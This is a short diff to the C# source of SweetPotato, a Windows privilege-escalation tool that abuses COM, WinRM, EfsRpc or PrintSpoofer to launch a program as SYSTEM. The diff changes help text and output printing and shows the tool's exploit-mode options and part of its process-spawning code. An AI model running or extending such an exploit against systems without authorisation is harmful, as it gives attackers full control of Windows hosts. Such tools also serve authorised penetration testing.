@@ -22,7 +22,7 @@ namespace SweetPotatoNew {
             ExecutionMethod executionMethod = ExecutionMethod.Auto;
             PotatoAPI.Mode mode = PotatoAPI.Mode.PrintSpoofer;
             bool showHelp = false;
-            bool isBITSRequired = false;
+            bool isBITSRequired = false; 
 
             Console.WriteLine(
                 "SweetPotato by @_EthicalChaos_\n" +
@@ -37,7 +37,7 @@ namespace SweetPotatoNew {
                 .Add<string>("c=|clsid=", "CLSID (default BITS:\n4991D34B-80A1-4291-83B6-3328366B9097)", v => clsId = v)
                 .Add<ExecutionMethod>("m=|method=", "Auto,User,Thread (default Auto)", v => executionMethod = v)
                 .Add("p=|prog=", "Program to launch (default cmd.exe)", v => program = v)
-                .Add("a=|args=", "Arguments for program (default null)", v => programArgs = v)
+                .Add("a=|args=", "Arguments for program (default whoami)", v => programArgs = v)
                 .Add<PotatoAPI.Mode>("e=|exploit=", "Exploit mode\n[DCOM|WinRM|EfsRpc|PrintSpoofer(default)] ", v => mode = v)
                 .Add<ushort>("l=|listenPort=", "COM server listen port (default 6666)", v => port = v)
                 .Add("h|help", "Display this help", v => showHelp = v != null);
@@ -151,6 +151,7 @@ namespace SweetPotatoNew {
                     CloseHandle(out_write);
                     byte[] buf = new byte[BUFSIZE];
                     int dwRead = 0;
+                    Console.WriteLine("execution output:");
                     while (ReadFile(out_read, buf, BUFSIZE, ref dwRead, IntPtr.Zero))
                     {
                         byte[] outBytes = new byte[dwRead];
@@ -160,10 +161,8 @@ namespace SweetPotatoNew {
                     CloseHandle(out_read);
                     Console.WriteLine("[+] Process created, enjoy!");
                 });
-
                 systemThread.Start();
                 systemThread.Join();
-
             } catch (Exception e) {
                 Console.WriteLine("[!] Failed to exploit COM: {0} ", e.Message);
                 Console.WriteLine(e.StackTrace.ToString());
